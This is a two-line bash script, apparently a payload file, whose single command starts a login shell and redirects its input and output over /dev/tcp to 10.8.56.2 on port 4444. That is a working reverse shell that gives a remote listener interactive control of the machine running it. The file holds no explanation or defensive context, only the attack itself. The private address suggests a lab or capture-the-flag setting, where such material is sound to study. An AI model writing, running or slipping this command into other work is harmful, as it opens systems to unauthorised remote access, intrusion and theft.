#!/bin/bash
/bin/sh -l > /dev/tcp/10.8.56.2/4444 0<&1 2>&1
